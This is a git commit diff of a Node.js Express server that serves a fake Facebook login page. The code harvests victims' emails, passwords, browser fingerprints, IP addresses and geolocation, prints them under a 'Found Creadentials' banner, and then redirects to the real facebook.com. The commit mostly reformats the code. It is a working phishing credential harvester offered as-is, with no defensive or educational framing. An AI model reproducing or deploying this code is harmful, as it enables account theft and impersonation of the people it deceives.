4a1d4d39fcc87207142f4819a766e86c4aed61c3
sai1004 <saikiran.bavandla@gmail.com>
2019-12-16 20:14:03 +0530

    commit

--- index.js
+++ index.js
@@ -1,46 +1,58 @@
 const express = require("express");
-const os = require("os");
 const app = express();
-const geoip = require('geoip-lite'); // npm install --save geoip-lite
+const geoip = require("geoip-lite"); // npm install --save geoip-lite
 const Sniffr = require("sniffr"); // npm install --save sniffr
-const requestIp = require('request-ip'); // npm install --save request-ip
+const requestIp = require("request-ip"); // npm install --save request-ip
 
-const HOST = process.env.HOST || '0.0.0.0';
+const HOST = process.env.HOST || "0.0.0.0";
 const PORT = process.env.PORT || 3000;
-
 
 app.use(express.urlencoded({ extended: false }));
 
 app.get("/", (req, res) => {
   res.sendFile(__dirname + "/templates/facebook.html");
-
 });
 
 app.post("/facebook", (req, res) => {
   const email = req.body.email;
   const password = req.body.password;
-  const userAgent = req.headers['user-agent'];
-  const s = new Sniffr();
-  s.sniff(userAgent);
+  const userAgent = req.headers["user-agent"];
+  const startSniff = new Sniffr();
+
+  startSniff.sniff(userAgent);
+
   const clientIp = requestIp.getClientIp(req);
   const geo = geoip.lookup(clientIp); // will be set to null if server is accessed locally
-  res.statusCode = 200;
-  res.setHeader('Content-Type', 'application/json');
-  console.log(
-    '<===========================================================================>',
-    JSON.stringify({
-    email,
-    password,
-    ...s,
-    clientIp,
-    geo
-  }, null, 2));
- 
-  return res.redirect('http://www.facebook.com');
 
+  res.statusCode = 200;
+  res.setHeader("Content-Type", "application/json");
+
+  console.log(
+    `
+    
+    """"""""""""""""""""""""""" Found Creadentials """""""""""""""""""""""""""""""""
+    
+    `,
+    JSON.stringify(
+      {
+        email,
+        password,
+        ...startSniff,
+        clientIp,
+        geo
+      },
+      null,
+      2
+    )
+  );
+  console.log(
+    `""""""""""""""""""""""""""" Waiting For Other Victim """""""""""""""""""""""""""""""""`
+  );
+
+  return res.redirect("http://www.facebook.com");
 });
 
-app.listen(PORT, HOST , err => {
+app.listen(PORT, HOST, err => {
   if (err) throw err;
 
   console.log(`
@@ -58,4 +70,3 @@ app.listen(PORT, HOST , err => {
 
 `);
 });
-
